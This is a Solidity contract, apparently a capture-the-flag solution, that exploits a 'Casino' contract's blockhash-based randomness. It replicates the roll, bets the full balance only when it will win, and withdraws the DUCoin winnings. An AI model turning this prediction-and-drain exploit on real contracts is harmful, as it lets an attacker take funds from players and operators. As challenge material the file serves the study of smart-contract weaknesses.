//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./Casino.sol";
import "./DUCoin.sol";

contract ResolveCasino {
    Casino public casino;
    DUCoin public ducoin;
    
    constructor(address addr){
        casino = Casino(addr);
        ducoin = DUCoin(casino.ducoin());

        casino.getTrialCoins();
        ducoin.increaseAllowance(address(this), 7);
        ducoin.increaseAllowance(addr, 7);

        casino.deposit(7);
    }

    function randomNumber() public view returns(uint8) {
        uint256 ab = uint256(blockhash(block.number - 1));
        uint256 a = ab & 0xffffffff;
        uint256 b = (ab >> 32) & 0xffffffff;
        uint256 x = uint256(blockhash(block.number));
        return uint8((a * x + b) % 6);
    }

    function balance() public view returns(uint256){
        return casino.balances(address(this));
    }

    function bidIfWinning() external {

        uint8 roll = randomNumber();
        if(roll == 0) {
            casino.play(casino.balances(address(this)));
        }
    }

    function withdraw(uint256 amount) external {
        require(balance() >= amount, "Insufficient balance!");
        casino.withdraw(amount);
        ducoin.transfer(msg.sender, amount);
    }

}